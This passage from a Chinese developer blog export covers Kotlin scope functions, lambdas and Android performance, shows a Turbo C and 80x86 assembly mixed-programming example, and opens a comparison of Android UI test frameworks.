<li>链式调用中的副作用<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">// transforming data from api with intermediary variable</span></span><br><span class="line"><span class="keyword">val</span> rawData = api.getData()</span><br><span class="line">Log.debug(rawData)</span><br><span class="line">rawData.map &#123;  <span class="comment">/** other stuff */</span>  &#125;</span><br><span class="line"><span class="comment">// use 'also' to stay in the method chains</span></span><br><span class="line">api.getData()</span><br><span class="line">    .also &#123; Log.debug(it) &#125;</span><br><span class="line">    .map &#123; <span class="comment">/** other stuff */</span> &#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
</li>
<li><code>takeIf/takeUnless</code><ul>
<li>对象作为参数传入<code>lambda</code></li>
<li>返回值为对象本身或<code>null</code>（根据<code>lambda</code>中语句的<code>true or false</code>）</li>
<li>常见场景：<ul>
<li>链式调用形式的条件判断<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">val</span> outFile </span><br><span class="line">   = File(outputDir.path).takeIf &#123; it.exists() &#125; ?: <span class="keyword">return</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure>
混合使用举例：<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">// if...else...写法</span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">fun</span> <span class="title">testIfElse</span><span class="params">()</span></span>: Object? &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">if</span> (a !== <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">val</span> b = handleA(a)</span><br><span class="line">        <span class="keyword">if</span> (b !== <span class="literal">null</span>) &#123;</span><br><span class="line">            handleB(b)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="literal">null</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="literal">null</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// ?.let写法</span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">fun</span> <span class="title">testLet</span><span class="params">()</span></span>: Object? &#123;</span><br><span class="line">    <span class="keyword">return</span> a?.let &#123; handleA(it) &#125;?.let &#123; handleB(it) &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
简洁，避免大量判空<code>if</code>的使用<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line">File(url).takeIf &#123; it.exists() &#125;</span><br><span class="line">        ?.let &#123;</span><br><span class="line">            JSONObject(NetworkUtils.postFile(<span class="number">20</span> * <span class="number">1024</span>, <span class="string">"http://i.snssdk.com/2/data/upload_image/"</span>, <span class="string">"image"</span>, url))</span><br><span class="line">        &#125;?.takeIf &#123; it.optString(<span class="string">"message"</span>) == <span class="string">"success"</span> &#125;</span><br><span class="line">        ?.let &#123;</span><br><span class="line">            post(content, contact, it.optJSONObject(<span class="string">"data"</span>)?.optString(<span class="string">"web_uri"</span>))</span><br><span class="line">        &#125; ?: mHandler.post &#123; view?.onFail() &#125;</span><br></pre></td></tr></table></figure>
可以将逻辑划分清楚，直观，避免判空打断思路。<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">getMessages</span><span class="params">(context: <span class="type">Context</span>, cursor: <span class="type">Int</span>, direction: <span class="type">Int</span>)</span></span>: ModelResult&lt;MessageResponse&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> UrlBuilder(LOAD_NOTIFY)</span><br><span class="line">            .apply &#123;</span><br><span class="line">                addParam(<span class="string">"cursor"</span>, cursor)</span><br><span class="line">                addParam(<span class="string">"direction"</span>, direction)</span><br><span class="line">            &#125;.let &#123;</span><br><span class="line">                queryDataFromServer(it.build())</span><br><span class="line">            &#125;?.let &#123;</span><br><span class="line">                <span class="keyword">val</span> statusCode = it.optInt(<span class="string">"status_code"</span>, -<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">val</span> statusMessage = it.optString(<span class="string">"status_message"</span>)</span><br><span class="line">                <span class="keyword">if</span> (statusCode == <span class="number">0</span>) &#123;</span><br><span class="line">                    MessageParser.parseMessageList(it.optString(<span class="string">"data"</span>))</span><br><span class="line">                            ?.let &#123;</span><br><span class="line">                                ModelResult(<span class="literal">true</span>, statusMessage, it)</span><br><span class="line">                            &#125;</span><br><span class="line">                            ?: ModelResult&lt;MessageResponse&gt;()</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            ?: ModelResult&lt;MessageResponse&gt;())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
同样是划分逻辑，更加清晰？（需要适应）</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>附图一张：</p>
<p><img src="/images/introduce_kotlin4.jpg" alt=""></p>
<blockquote>
<p><a href="https://medium.com/@elye.project/using-kotlin-takeif-or-takeunless-c9eeb7099c22" target="_blank" rel="noopener">https://medium.com/@elye.project/using-kotlin-takeif-or-takeunless-c9eeb7099c22</a></p>
</blockquote>
<blockquote>
<p><a href="https://proandroiddev.com/the-tldr-on-kotlins-let-apply-also-with-and-run-functions-6253f06d152b" target="_blank" rel="noopener">https://proandroiddev.com/the-tldr-on-kotlins-let-apply-also-with-and-run-functions-6253f06d152b</a></p>
</blockquote>
<blockquote>
<p><a href="https://proandroiddev.com/the-difference-between-kotlins-functions-let-apply-with-run-and-else-ca51a4c696b8" target="_blank" rel="noopener">https://proandroiddev.com/the-difference-between-kotlins-functions-let-apply-with-run-and-else-ca51a4c696b8</a></p>
</blockquote>
<h4 id="Lambda表达式"><a href="#Lambda表达式" class="headerlink" title="Lambda表达式"></a>Lambda表达式</h4><p>本质上是一个匿名方法（单方法接口）<br><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">isGreaterThanZero</span><span class="params">(n: <span class="type">Int</span>)</span></span>: <span class="built_in">Boolean</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> n &gt; <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">collection.filter(::isGreaterThanZero)</span><br><span class="line"><span class="comment">// 使用Lambda</span></span><br><span class="line">collection.filter&#123; i: <span class="built_in">Int</span> -&gt; i &gt; <span class="number">0</span> &#125;</span><br><span class="line">collection.filter&#123; i -&gt; i &gt; <span class="number">0</span> &#125;</span><br><span class="line">collection.filter&#123; it &gt; <span class="number">0</span> &#125;</span><br></pre></td></tr></table></figure><br>单方法接口都可以传<code>Lambda</code>：<br><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line">button.setOnClickListener(new View.OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> void onClick(View v) &#123;</span><br><span class="line">        showToast();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">button.setOnClickListener&#123; showToast() &#125;</span><br></pre></td></tr></table></figure><br>内置常用的流处理<code>Lambda</code>：<br><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line">names</span><br><span class="line">        .filter&#123; it.startsWith(<span class="string">"A"</span>) &#125;</span><br><span class="line">        .sortedBy&#123; it &#125;</span><br><span class="line">        .map&#123; it.toUpperCase() &#125;</span><br><span class="line">        .forEach&#123; print(it) &#125;</span><br></pre></td></tr></table></figure><br>配合<code>Rxjava</code>使用更佳（也有<code>Rxkotlin</code>）。</p>
<h3 id="在Android上"><a href="#在Android上" class="headerlink" title="在Android上"></a>在Android上</h3><p>官方提供的扩展</p>
<h4 id="View-Binding"><a href="#View-Binding" class="headerlink" title="View Binding"></a>View Binding</h4><p>全自动，无需声明，无需<code>findViewById</code>，直接使用<code>layout id</code>就行<br><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line">text_view.text = <span class="string">"text"</span></span><br></pre></td></tr></table></figure></p>
<h4 id="Parcelable-注解"><a href="#Parcelable-注解" class="headerlink" title="@Parcelable 注解"></a>@Parcelable 注解</h4><p>一个注解自动实现<code>Parcelable</code>， 仍在实验阶段</p>
<h4 id="异步"><a href="#异步" class="headerlink" title="异步"></a>异步</h4><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="comment">// uiThread如果是Activity isFinish = true是不会调用的</span></span><br><span class="line">doAsync &#123;</span><br><span class="line">    print(<span class="string">"其他线程"</span>)</span><br><span class="line">    uiThread &#123; </span><br><span class="line">        print(<span class="string">"UI线程"</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="Gradle-DSL"><a href="#Gradle-DSL" class="headerlink" title="Gradle DSL"></a>Gradle DSL</h4><blockquote>
<p><a href="https://docs.gradle.org/current/dsl/index.html" target="_blank" rel="noopener">https://docs.gradle.org/current/dsl/index.html</a></p>
</blockquote>
<h3 id="其他黑科技"><a href="#其他黑科技" class="headerlink" title="其他黑科技"></a>其他黑科技</h3><ul>
<li>没有必检异常了</li>
<li>支持运算符重载（<code>String</code>的比较可以用<code>==</code>了）</li>
<li>接口可以有缺省方法</li>
<li><code>Object Class</code>单例</li>
<li><code>Data Class</code>数据类型，自动实现<code>equals/hashCode/toString</code></li>
<li>协程（没用过）</li>
<li>伴生对象</li>
<li><code>Anko</code>扩展</li>
</ul>
<blockquote>
<p><a href="https://www.jianshu.com/p/9f720b9ccdea" target="_blank" rel="noopener">https://www.jianshu.com/p/9f720b9ccdea</a></p>
</blockquote>
<blockquote>
<p><a href="https://www.tuicool.com/articles/aEbeayN" target="_blank" rel="noopener">https://www.tuicool.com/articles/aEbeayN</a></p>
</blockquote>
<blockquote>
<p><a href="https://github.com/android/android-ktx" target="_blank" rel="noopener">https://github.com/android/android-ktx</a></p>
</blockquote>
<blockquote>
<p><a href="https://github.com/adisonhuang/awesome-kotlin-android" target="_blank" rel="noopener">https://github.com/adisonhuang/awesome-kotlin-android</a> 其他开源库</p>
</blockquote>
<h2 id="与Java协作"><a href="#与Java协作" class="headerlink" title="与Java协作"></a>与Java协作</h2><p>结论：100%协同，Kotlin调Java没有问题，Java调Kotlin会有些绕，但不会出问题。</p>
<h2 id="性能对比"><a href="#性能对比" class="headerlink" title="性能对比"></a>性能对比</h2><h3 id="运行性能"><a href="#运行性能" class="headerlink" title="运行性能"></a>运行性能</h3><p>来源：<a href="https://blog.dreamtobe.cn/kotlin-performance/" target="_blank" rel="noopener">https://blog.dreamtobe.cn/kotlin-performance/</a></p>
<ul>
<li>性能相比Java更差相关<ul>
<li>对<code>varargs</code>参数展开，Kotlin比Java慢1倍，主要原因是在Kotlin在展开<code>varargs</code>前需要全量拷贝整个数组，这个是非常高的性能开销。</li>
<li>对<code>Delegated Properties</code>的应用，Kotlin相比Java慢10%。</li>
</ul>
</li>
<li>性能相比Java更优相关<ul>
<li>对<code>Lambda</code>的使用，Kotlin相比Java快30%，而对用例中的<code>transaction</code>添加<code>inline</code>关键字配置内联后，发现其反而慢了一点点(约1.14%)。</li>
<li>Kotlin对<code>companion object</code>的访问相比Java中的静态变量的访问，Kotlin与Java差不多快或更快一点。</li>
<li>Kotlin对局部函数(<code>Local Functions</code>)的访问相比Java中的局部函数的访问，Kotlin与Java差不多快或更快一点。</li>
<li>Kotlin的非空参数的使用相比没有使用空检查的Java，Kotlin与Java差不多快或更快一点。</li>
</ul>
</li>
<li>Kotlin自身比较<ul>
<li>对于基本类型范围的使用，无论是否使用常量引用还是直接的范围速度都差不多。</li>
<li>对于非基本类型范围的使用，常量引用相比直接的范围会快3%左右。</li>
<li>对于范围遍历方式中，<code>for</code>循环方式无论有没有使用<code>step</code>速度都差不多，但是如果对范围直接进行<code>.foreach</code>速度会比它们慢3倍，因此避免对范围直接使用<code>.foreach</code>。</li>
<li>在遍历中使用<code>lastIndex</code>会比使用<code>indices</code>快2%左右。</li>
</ul>
</li>
</ul>
<h3 id="包大小"><a href="#包大小" class="headerlink" title="包大小"></a>包大小</h3><p>标准库大小<code>100k</code>左右。</p>
<p>新建标准工程（不带Kotlin支持），开启混淆，打release包。</p>
<p>将这个工程文件转为Kotlin实现，引入Kotlin支持，打release包，对比大小：</p>
<p><img src="/images/introduce_kotlin5.png" alt=""></p>
<p>增加了约<code>109k</code></p>
<p>将某应用一个module转换为Kotlin实现（直接使用AS的工具转换），对比编译生成的所有<code>class</code>文件大小：</p>
<p><img src="/images/introduce_kotlin6.png" alt=""></p>
<p>增加了约2%的体积。</p>
<blockquote>
<p><a href="https://discuss.kotlinlang.org/t/kotlin-generated-class-file-out-of-kt-is-bigger-than-java-file/1520/4" target="_blank" rel="noopener">https://discuss.kotlinlang.org/t/kotlin-generated-class-file-out-of-kt-is-bigger-than-java-file/1520/4</a></p>
</blockquote>
<blockquote>
<p><a href="https://blog.dreamtobe.cn/2016/11/30/kotlin/" target="_blank" rel="noopener">https://blog.dreamtobe.cn/2016/11/30/kotlin/</a></p>
</blockquote>
<h3 id="编译速度"><a href="#编译速度" class="headerlink" title="编译速度"></a>编译速度</h3><p>冷编译会慢一些，由于增量编译的存在，热编译速度比Java快。</p>
]]></content>
      <categories>
        <category>Android</category>
        <category>Kotlin</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>Kotlin</tag>
      </tags>
  </entry>
  <entry>
    <title>80x86下汇编与C语言的混合编程</title>
    <url>/2018/07/02/80x86_asm_c/</url>
    <content><![CDATA[<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>在汇编课程中的实验中要求了我们在<code>80x86</code>下实现C语言与汇编代码的混合编程，虽然<code>80x86</code>时代离现代有些久远，但我们仍可以把<code>80x86</code>当作<code>x86</code>的一个简化版本来学习一些重要的概念。</p>
<h2 id="从一个例子开始"><a href="#从一个例子开始" class="headerlink" title="从一个例子开始"></a>从一个例子开始</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">int</span> <span class="title">test_fun</span><span class="params">(<span class="keyword">void</span> *param)</span></span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">int</span> var_from_asm;</span><br><span class="line"><span class="keyword">int</span> global_init = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">int</span> global;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> static_init = <span class="number">1000</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> static_var;</span><br><span class="line"><span class="keyword">char</span> *<span class="built_in">string</span> = <span class="string">"test string"</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> value = <span class="number">666</span>;</span><br><span class="line">    test_fun(&amp;value);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"var from asm:%d\n"</span>, var_from_asm);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"assign from asm:%d\n"</span>, global);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"value passed by stack:%d\n"</span>, global_init);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<p>可以看到我们在C语言中分别定义了几种类型的变量：初始化过的全局变量、未初始化的全局变量、初始化过的静态变量、未初始化的静态变量与字符串。定义这些变量是为了查看编译后各变量所处的数据段与存放形式。</p>
<p>同时也声明了一个外部函数<code>test_fun()</code>与一个外部变量<code>var_from_asm</code>，用来测试C语言对<code>asm</code>声明的符号的引用。</p>
<p>现在我们编译这个C语言文件到汇编文件，使用<code>TC2.0</code>的命令行工具<code>tcc</code>，使用<code>-S</code>参数，即可在同目录生成同名的<code>ASM</code>文件：</p>
<p><img src="/images/8086asmc1.png" alt=""></p>
<p>我们打开文件，删除一些debug信息后的结果如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_TEXT	segment byte public &#39;CODE&#39;</span><br><span class="line">_TEXT	ends</span><br><span class="line">DGROUP	group	_DATA,_BSS</span><br><span class="line">	assume	cs:_TEXT,ds:DGROUP</span><br><span class="line">_DATA	segment word public &#39;DATA&#39;</span><br><span class="line">_DATA	ends</span><br><span class="line">_BSS	segment word public &#39;BSS&#39;</span><br><span class="line">_BSS	ends</span><br><span class="line">_DATA	segment word public &#39;DATA&#39;</span><br><span class="line">_global_init	label	word</span><br><span class="line">	db	10</span><br><span class="line">	db	0</span><br><span class="line">static_init	label	word</span><br><span class="line">	db	232</span><br><span class="line">	db	3</span><br><span class="line">_string	label	word</span><br><span class="line">	dw	DGROUP:s@</span><br><span class="line">_DATA	ends</span><br><span class="line">_TEXT	segment byte public &#39;CODE&#39;</span><br><span class="line">   ;	</span><br><span class="line">   ;	int main() &#123;</span><br><span class="line">   ;	</span><br><span class="line">	assume	cs:_TEXT</span><br><span class="line">_main	proc	near</span><br><span class="line">	push	bp</span><br><span class="line">	mov	bp,sp</span><br><span class="line">	sub	sp,2</span><br><span class="line">   ;	</span><br><span class="line">   ;	    int value &#x3D; 666;</span><br><span class="line">   ;	</span><br><span class="line">	mov	word ptr [bp-2],666</span><br><span class="line">   ;	</span><br><span class="line">   ;	    test_fun(&amp;value);</span><br><span class="line">   ;	</span><br><span class="line">	lea	ax,word ptr [bp-2]</span><br><span class="line">	push	ax</span><br><span class="line">	call	near ptr _test_fun</span><br><span class="line">	pop	cx</span><br><span class="line">   ;	</span><br><span class="line">   ;	    printf(&quot;var from asm:%d\n&quot;, var_from_asm);</span><br><span class="line">   ;	</span><br><span class="line">	push	word ptr DGROUP:_var_from_asm</span><br><span class="line">	mov	ax,offset DGROUP:s@+12</span><br><span class="line">	push	ax</span><br><span class="line">	call	near ptr _printf</span><br><span class="line">	pop	cx</span><br><span class="line">	pop	cx</span><br><span class="line">   ;	</span><br><span class="line">   ;	    printf(&quot;assign from asm:%d\n&quot;, global);</span><br><span class="line">   ;	</span><br><span class="line">	push	word ptr DGROUP:_global</span><br><span class="line">	mov	ax,offset DGROUP:s@+29</span><br><span class="line">	push	ax</span><br><span class="line">	call	near ptr _printf</span><br><span class="line">	pop	cx</span><br><span class="line">	pop	cx</span><br><span class="line">   ;	</span><br><span class="line">   ;	    printf(&quot;value passed by stack:%d\n&quot;, global_init);</span><br><span class="line">   ;	</span><br><span class="line">	push	word ptr DGROUP:_global_init</span><br><span class="line">	mov	ax,offset DGROUP:s@+49</span><br><span class="line">	push	ax</span><br><span class="line">	call	near ptr _printf</span><br><span class="line">	pop	cx</span><br><span class="line">	pop	cx</span><br><span class="line">   ;	</span><br><span class="line">   ;	    return 0;</span><br><span class="line">   ;	</span><br><span class="line">	xor	ax,ax</span><br><span class="line">	jmp	short @1@58</span><br><span class="line">@1@58:</span><br><span class="line">   ;	</span><br><span class="line">   ;	&#125;</span><br><span class="line">   ;	</span><br><span class="line">	mov	sp,bp</span><br><span class="line">	pop	bp</span><br><span class="line">	ret	</span><br><span class="line">_main	endp</span><br><span class="line">_TEXT	ends</span><br><span class="line">_BSS	segment word public &#39;BSS&#39;</span><br><span class="line">static_var	label	word</span><br><span class="line">	db	2 dup (?)</span><br><span class="line">_global	label	word</span><br><span class="line">	db	2 dup (?)</span><br><span class="line">_BSS	ends</span><br><span class="line">_DATA	segment word public &#39;DATA&#39;</span><br><span class="line">s@	label	byte</span><br><span class="line">	db	&#39;test string&#39;</span><br><span class="line">	db	0</span><br><span class="line">	db	&#39;var from asm:%d&#39;</span><br><span class="line">	db	10</span><br><span class="line">	db	0</span><br><span class="line">	db	&#39;assign from asm:%d&#39;</span><br><span class="line">	db	10</span><br><span class="line">	db	0</span><br><span class="line">	db	&#39;value passed by stack:%d&#39;</span><br><span class="line">	db	10</span><br><span class="line">	db	0</span><br><span class="line">_DATA	ends</span><br><span class="line">_TEXT	segment byte public &#39;CODE&#39;</span><br><span class="line">_TEXT	ends</span><br><span class="line">	public	_main</span><br><span class="line">	public	_string</span><br><span class="line">_static_var	equ	static_var</span><br><span class="line">_static_init	equ	static_init</span><br><span class="line">	public	_global</span><br><span class="line">	public	_global_init</span><br><span class="line">	extrn	_var_from_asm:word</span><br><span class="line">	extrn	_test_fun:near</span><br><span class="line">	extrn	_printf:near</span><br><span class="line">_s@	equ	s@</span><br><span class="line">	end</span><br></pre></td></tr></table></figure>
<p>首先可以发现几个数据段：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_TEXT	segment byte public &#39;CODE&#39;</span><br><span class="line">_DATA	segment word public &#39;DATA&#39;</span><br><span class="line">_BSS	segment word public &#39;BSS&#39;</span><br></pre></td></tr></table></figure>
<p>是不是很熟悉？虽然是<code>80386</code>，但是现代<code>ELF</code>中仍可以见到这几个节的身影。<br><code>DGROUP    group    _DATA,_BSS
DGROUP</code>表示<code>_DATA</code>与<code>_BSS</code>段合成的段标号。<br>分析这几个段中的内容，可以发现<code>_TEXT</code>段即运行时的CS段，存放着代码。<br><code>_DATA</code>段中存放着下列内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_global_init	label	word</span><br><span class="line">	db	10</span><br><span class="line">	db	0</span><br><span class="line">static_init	label	word</span><br><span class="line">	db	232</span><br><span class="line">	db	3</span><br><span class="line">_string	label	word</span><br><span class="line">	dw	DGROUP:s@</span><br></pre></td></tr></table></figure>
<p>前两个即已经初始化的全局变量与静态变量。第三个是一个别名，找到它的定义：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">s@	label	byte</span><br><span class="line">	db	&#39;test string&#39;</span><br><span class="line">	db	0</span><br><span class="line">	db	&#39;var from asm:%d&#39;</span><br><span class="line">	db	10</span><br><span class="line">	db	0</span><br><span class="line">	db	&#39;assign from asm:%d&#39;</span><br><span class="line">	db	10</span><br><span class="line">	db	0</span><br><span class="line">	db	&#39;value passed by stack:%d&#39;</span><br><span class="line">	db	10</span><br><span class="line">	db	0</span><br></pre></td></tr></table></figure>
<p>我们不但在<code>s@</code>处发现了字符串常量<code>test string</code>，而且发现这里存放着<code>printf</code>中使用的格式化字符串。</p>
<p><code>_BSS</code>（意为<code>Block Started by Symbol</code>）中存放着为尚未初始化或初始化为零的全局或静态变量预留的空间，在这里，它存放着如下内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">static_var	label	word</span><br><span class="line">	db	2 dup (?)</span><br><span class="line">_global	label	word</span><br><span class="line">	db	2 dup (?)</span><br></pre></td></tr></table></figure>
<p>你可能已经发现，我们在C语言中定义的变量在生成的汇编代码中被加上了下划线前缀，其实不光是变量名，函数名也会被编译器做相同的处理：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_main	proc	near</span><br></pre></td></tr></table></figure>
<p>在文件的末尾还有如下内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">	public	_main</span><br><span class="line">	public	_string</span><br><span class="line">_static_var	equ	static_var</span><br><span class="line">_static_init	equ	static_init</span><br><span class="line">	public	_global</span><br><span class="line">	public	_global_init</span><br><span class="line">	extrn	_var_from_asm:word</span><br><span class="line">	extrn	_test_fun:near</span><br><span class="line">	extrn	_printf:near</span><br><span class="line">_s@	equ	s@</span><br></pre></td></tr></table></figure>
<p>可以看到使用<code>public</code>关键字声明了全局变量<code>string</code>、<code>global</code>、<code>global_init</code>与函数<code>main</code>，以便外部去引用他们。同时也使用<code>extrn</code>关键字声明了外部定义的<code>_var_from_asm</code>、<code>_test_fun</code>、<code>_printf</code>，在链接时会解析这些标记完成偏移地址的修改。</p>
<p>到这里我们已经分析完了<code>test.c</code>编译后的内容。</p>
<p>下面是测试使用的汇编程序<code>t.asm</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public _test_fun</span><br><span class="line">public _var_from_asm</span><br><span class="line">extrn _global:byte, _global_init:byte</span><br><span class="line"></span><br><span class="line">_DATA	segment use16 word public &#39;DATA&#39;</span><br><span class="line">    _var_from_asm label word</span><br><span class="line">        db 10</span><br><span class="line">        db 0</span><br><span class="line">_DATA ends</span><br><span class="line"></span><br><span class="line">_TEXT segment use16 byte public &#39;CODE&#39;</span><br><span class="line">    assume CS:_TEXT, DS:_DATA</span><br><span class="line"></span><br><span class="line">_test_fun proc near</span><br><span class="line">    push bp</span><br><span class="line">    mov bp, sp</span><br><span class="line">    push di</span><br><span class="line">    mov ax, 6[bp]</span><br><span class="line">    mov word ptr _global_init, ax</span><br><span class="line">    mov word ptr _global, 100</span><br><span class="line">    pop di</span><br><span class="line">    pop bp</span><br><span class="line">    ret</span><br><span class="line">_test_fun endp</span><br><span class="line">_TEXT ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
<p>程序比较简单，在头部同样地声明了对外的符号与引用的外部的符号。</p>
<p>同时，为了实现与C程序的相互引用，我们使用相同的标识定义了<code>_DATA</code>段与<code>_TEXT</code>段，为了使C语言可以以<code>var_from_asm</code>的形式使用汇编中定义的变量，所以在<code>_DATA</code>段中使用<code>_var_from_asm</code>声明了两个字节并初始化为<code>10</code>的空间。</p>
<p>同理，在<code>_TEXT</code>段中使用<code>_test_fun</code>作为子程序名定义了函数<code>test_fun</code>。</p>
<p>而在<code>test_fun</code>中，我们先将<code>bp</code>入栈，将<code>sp</code>赋给<code>bp</code>后，将<code>bp+6</code>位置的值赋给了<code>ax</code>，在函数调用的时候，会先将参数入栈，然后将<code>CS</code>与<code>IP</code>入栈，占用了<code>4</code>个字节的栈空间，函数内调用<code>push bp</code>又占用了<code>2</code>个字节的栈空间，所以传入的参数应该在<code>bp+6</code>的位置上。我们将这个参数值写回到C语言定义的全局变量<code>_global_init</code>中，下一行将<code>_global</code>赋上了<code>100</code>。</p>
<p>现在，就可以进行编译链接步骤了。</p>
<p>一般地，我们可以使用C编译器编译<code>test.c</code>生成目标文件，使用<code>TASM</code>汇编编译器编译<code>t.asm</code>生成目标文件，再使用<code>tlink</code>将生成的目标文件与库提供的目标文件进行链接，但是这样做略显麻烦，<code>tcc</code>会调用<code>TASM</code>编译汇编文件，也会将生成的目标文件和库文件一起链接并生成最后的可执行文件，所以我们只要简单地执行<code>tcc test.c t.asm</code>就可以了。</p>
<p><img src="/images/8086asmc2.png" alt=""></p>
<p>直接运行生成的test.exe，查看结果：</p>
<p><img src="/images/8086asmc3.png" alt=""></p>
]]></content>
      <categories>
        <category>Assembly</category>
      </categories>
      <tags>
        <tag>Assembly</tag>
      </tags>
  </entry>
  <entry>
    <title>Android UI自动化测试技术选择与踩坑</title>
    <url>/2018/02/09/android_ui_test/</url>
    <content><![CDATA[<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>在<a href="https://developer.android.com/training/testing/fundamentals.html" target="_blank" rel="noopener">官方文档关于测试一节</a>中，介绍了测试金字塔这一概念：<br><img src="/images/ui_test_1.png" alt=""><br>即我们应该包括三个层次的测试：小型、中型、与大型：</p>
<ul>
<li>小型测试是单元测试，即可以独立运行在每个模块上的测试。它们通常模拟了每个主要的组件并且应该快速地运行。</li>
<li>中型测试是介于大型与小型测试之间的综合测试，它们集成了数个组件并且运行在模拟器或实机上。</li>
<li>大型测试是以模拟UI工作流方式进行的综合UI测试，它们保证了关键的终端用户的使用可以符合我们的预期。<br>虽然小型测试迅速并且专注，可以让我们很快地发现错误，但它们同样是低仿真且自成一体的，这使得我们很难保证通过了所有的单元测试就可以成功地让App运行。而大型测试的优缺点恰恰与上述相反。<br>由于每个层次的测试的角色各不相同，我们应该进行所有这三个层次的测试，尽管各个层次使用比例需要根据App的使用特点，通常建议三个测试的比例为1:2:7。<br>UI自动化测试即属于上面说的大型测试。<a id="more"></a>
<h2 id="测试框架功能对比"><a href="#测试框架功能对比" class="headerlink" title="测试框架功能对比"></a>测试框架功能对比</h2><h3 id="概览"><a href="#概览" class="headerlink" title="概览"></a>概览</h3>参考：</li>
<li><a href="https://stackoverflow.com/questions/20046021/google-espresso-or-robotium" target="_blank" rel="noopener">https://stackoverflow.com/questions/20046021/google-espresso-or-robotium</a><br><img src="/images/ui_test_2.png" alt=""><h3 id="实际测试编写体验"><a href="#实际测试编写体验" class="headerlink" title="实际测试编写体验"></a>实际测试编写体验</h3>实际的编写中，主要的步骤可以总结为三步：</li>
</ul>
<ol>
<li>如何定位想要操作的<code>View</code></li>
<li>如何施加想要进行操作</li>
<li>如何判断App的行为符合我们预期<br>三种框架都为我们提供了一系列方法，但细节与效果略有不同：</li>
</ol>
<ul>
<li>Espresso<ul>
<li>白盒测试，体现在可以直接拿到显示中的<code>View</code>实例，拿到<code>WebView</code> <code>DOM</code>树中的<code>Element</code></li>
<li>一般场景下，区分度较为明显的<code>View</code>(有唯一的<code>id</code> <code>tag</code>)等，可以通过多种途径定位，较为便捷</li>
<li>面对特殊场景：如<code>TabLayout</code>中的<code>Tab</code>时，由于它们拥有相同的类型与<code>id</code>，难以定位<code>view</code></li>
<li>出现多窗口情况（如<code>dialog</code>），可以正常处理</li>
<li>不能触发按返回键、改变屏幕方向等操作</li>
</ul>
</li>
<li>UI Automator<ul>
<li>黑盒测试，体现在无法拿到具体的<code>View</code>，只能拿到基类(<code>LinearLayout</code>等)，无法看到<code>WebView</code>的<code>DOM</code>树</li>
<li>一般场景下，定位<code>View</code>没有差别</li>
<li>面对特殊场景，可以通过找出所有符合条件的<code>View</code>再按索引找到想要的<code>View</code></li>
<li>出现多窗口情况：处理出现异常</li>
</ul>
</li>
<li>Robotium<ul>
<li>集合了上述框架的优点，既可以拿到显示中的<code>View</code>实例与<code>WebView</code>的<code>DOM</code>树</li>
